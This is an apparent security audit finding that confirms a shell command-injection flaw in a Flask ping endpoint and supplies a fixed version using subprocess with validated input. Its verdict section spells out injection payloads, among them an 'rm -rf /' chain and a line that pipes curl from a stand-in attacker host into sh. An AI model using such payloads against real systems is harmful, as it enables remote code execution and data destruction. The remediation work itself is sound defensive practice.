## Verdict

Confirmed. `target_host` comes directly from the JSON request body (`payload.get("host", "")`) with no validation beyond stripping whitespace, and is interpolated with `%` string formatting straight into a string passed to `os.system`, which runs it through `/bin/sh -c`. An admin-UI caller can submit a host value such as `"8.8.8.8; rm -rf / #"` or `` "8.8.8.8 && curl attacker/x | sh" `` and have arbitrary shell commands executed with the privileges of the Flask process.

## Source

`payload.get("host", "").strip()` at line 14, taken from `request.get_json(silent=True)` (the untrusted POST body) at line 13. This value flows unmodified into the `os.system("ping -c 4 %s > %s 2>&1" % (target_host, log_path))` call at line 21.

## Fix

### File: OsSystemStringFormat.py
```python
"""Network diagnostics endpoint for the internal admin dashboard."""

import ipaddress
import re
import subprocess

from flask import Flask, request, jsonify

app = Flask(__name__)

_HOSTNAME_RE = re.compile(
    r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)"
    r"(\.(?!-)[A-Za-z0-9-]{1,63}(?<!-))*$"
)


def _is_valid_target(host):
    """Accept only a bare IPv4/IPv6 literal or DNS hostname. Rejects a
    leading '-' (which ping could otherwise read as an option) and anything
    containing shell metacharacters, spaces, or other structure."""
    if not host or host.startswith("-"):
        return False
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        pass
    return bool(_HOSTNAME_RE.match(host))


@app.route("/admin/diagnostics/ping", methods=["POST"])
def run_ping_diagnostic():
    """Run a connectivity check against a host supplied by the admin UI and
    return the captured output so support staff can see the raw result."""
    payload = request.get_json(silent=True) or {}
    target_host = payload.get("host", "").strip()

    if not target_host:
        return jsonify({"error": "host is required"}), 400

    if not _is_valid_target(target_host):
        return jsonify({"error": "host must be a valid hostname or IP address"}), 400

    try:
        result = subprocess.run(
            ["ping", "-c", "4", "--", target_host],
            capture_output=True,
            text=True,
            timeout=10,
        )
    except subprocess.TimeoutExpired:
        return jsonify({"error": "ping timed out"}), 504

    output = result.stdout + result.stderr

    return jsonify({"host": target_host, "output": output})


if __name__ == "__main__":
    app.run(debug=True)
```

## Explanation

The root cause was building a shell command line by string-formatting untrusted input and handing it to `os.system`, which always runs the string through a shell (`/bin/sh -c`). The fix removes the shell entirely: `subprocess.run` is called with an argument list (`["ping", "-c", "4", "--", target_host]`, `shell` not set, so `shell=False` by default), so `target_host` is passed as a single literal `argv` element to `ping` and can never be parsed as shell syntax, no matter what characters it contains.

An argument list alone stops shell metacharacter injection but not option/flag injection - a value like `-c 1000000` or `--help` would still be read by `ping` itself as a flag if passed as a bare argument. Two defenses close that gap: `_is_valid_target` rejects any value that starts with `-` (in addition to enforcing that the value is a syntactically valid IPv4/IPv6 literal or DNS hostname via `ipaddress.ip_address` / a strict hostname regex, so control characters, spaces, and shell syntax are rejected outright rather than stripped), and `--` is placed before `target_host` in the argument list so that even a value that slipped past validation would be treated by `ping` as a non-option operand rather than a flag.

The command's stdout/stderr are captured directly via `capture_output=True, text=True` instead of redirecting to a shared log file and reading it back afterward, which also removes an unnecessary file dependency and a `2>&1`-style shell redirection that no longer has a shell to run in. A `timeout=10` bounds worst-case latency now that arbitrary shell chaining (which previously could have made the call hang indefinitely) is no longer possible, but bounding runtime is good practice regardless.

To verify: a request with `host` set to a normal hostname or IP (e.g. `"8.8.8.8"`) still returns ping output as before. A request with `host` set to an injection payload (e.g. `"8.8.8.8; id"`, `"$(whoami)"`, or a leading-dash value like `"--help"`) is now rejected with a 400 before any subprocess is spawned, and never reaches a shell or gets interpreted as a `ping` option.
